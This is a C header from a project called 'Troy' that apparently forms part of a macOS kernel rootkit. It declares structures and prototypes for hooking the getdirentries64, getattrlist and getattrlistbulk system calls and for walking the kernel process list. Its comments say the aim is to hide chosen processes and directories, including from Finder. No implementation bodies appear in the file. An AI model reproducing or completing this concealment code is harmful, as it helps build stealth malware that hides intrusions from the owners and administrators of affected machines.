//
//  HookCAPI.h
//  Troy
//
//  Created by Axis on 5/8/15.
//  Copyright (c) 2015 Axis. All rights reserved.
//

#ifndef __Troy__HookCAPI__
#define __Troy__HookCAPI__

#include <sys/attr.h>

#include "configure.h"

#define PROCESS_NAME_LENGTH 100+1
#define FILE_DIRENT_NAME_LENGTH 300+1

//attention:
//Althrough the struct proc have so many members, but for hiding the process,
//i only need the first memeber. If i get the first memeber, i will walk through
//all the prcess array.
struct	proc_yousemite
{
    LIST_ENTRY(proc_yousemite) p_list;
};

//the following three structures come from sysproto.h from Kernel.framework
//-----------------BEGIN------------------------
struct getdirentries64_args {
    int fd;
    user_addr_t bufp;
    user_size_t bufsize;
    user_addr_t position;
};

struct getattrlist_args
{
    user_addr_t path;
    user_addr_t alist;
    user_addr_t attributeBuffer;
    user_size_t bufferSize;
    user_ulong_t option;
};

struct getattrlistbulk_args
{
    int dirfd;
    user_addr_t alist;
    user_addr_t attributeBuffer;
    user_size_t bufferSize;
    uint64_t options;
};

//only get the following data
typedef struct val_attrs {
    uint32_t          length;
    attribute_set_t   returned;
    uint32_t          error;
    attrreference_t   name_info;
    char*             name;
} val_attrs_t;
//-----------------END------------------------

struct hide_proc
{
    TAILQ_ENTRY(hide_proc) next_ptr;
    TROY_TYPE type;
    struct proc_yousemite *proc;
    char name[PROCESS_NAME_LENGTH];
    int proc_pid;
};
TAILQ_HEAD(hide_proc_list, hide_proc);

struct hide_file_dirent
{
    TAILQ_ENTRY(hide_file_dirent) next_ptr;
    TROY_TYPE type;
    char name[FILE_DIRENT_NAME_LENGTH];
};
TAILQ_HEAD(hide_file_dirent_list, hide_file_dirent);


//typedef int (*kill_function_prototype)(proc_t cp, struct kill_args *uap, __unused int32_t *retval);
typedef int (*getdirentries64_function_prototype)(struct proc *p,
                                                  struct getdirentries64_args *uap,
                                                  user_ssize_t *retval);
/*typedef int (*getdirentriesattr_function_prototype)(struct proc *p,
                                                    struct getdirentriesattr_args *uap,
                                                    int32_t *retval);*/
typedef int (*getattrlist_function_prototype)(struct proc * p,
                                              struct getattrlist_args *uap,
                                              int32_t *retval);
//for hide file in finder
//this function is a complete new funtion, and only support on Yousemite.
typedef int (*getattrlistbulk_function_prototype)(proc_t p,
                                                 struct getattrlistbulk_args *uap,
                                                 int32_t *retval);

int hide_given_directory(troy_hide_object *directory_hide);
errno_t hide_given_process(troy_hide_object *process_hide);
int my_getdirentries64_callback(struct proc *p, struct getdirentries64_args *uap, user_ssize_t *retval);
int my_getattrlistbulk_callback(struct proc * p,struct getattrlistbulk_args *uap,int32_t *retval);

#endif /* defined(__Troy__HookCAPI__) */
